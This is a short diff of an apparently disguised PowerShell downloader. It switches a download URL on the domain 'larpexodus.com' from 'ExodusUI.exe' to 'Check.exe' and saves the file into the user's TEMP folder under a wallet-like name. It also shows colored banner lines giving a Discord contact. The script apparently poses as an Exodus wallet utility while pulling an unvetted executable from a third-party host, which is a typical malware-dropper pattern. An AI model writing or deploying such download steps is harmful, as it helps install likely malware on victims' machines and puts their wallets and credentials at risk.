@@ -1,4 +1,4 @@
-$exeUrl  = "https://larpexodus.com/ExodusUI.exe"
+$exeUrl  = "https://larpexodus.com/Check.exe"
 $exePath = "$env:TEMP\ExodusUI.exe"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
@@ -308,6 +308,7 @@ Write-Host "$space╰───────────────────�
 Write-Host "$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
 Write-Host "$space│          Discord @641               │" -ForegroundColor $yellow
 Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow
+
 
 
 
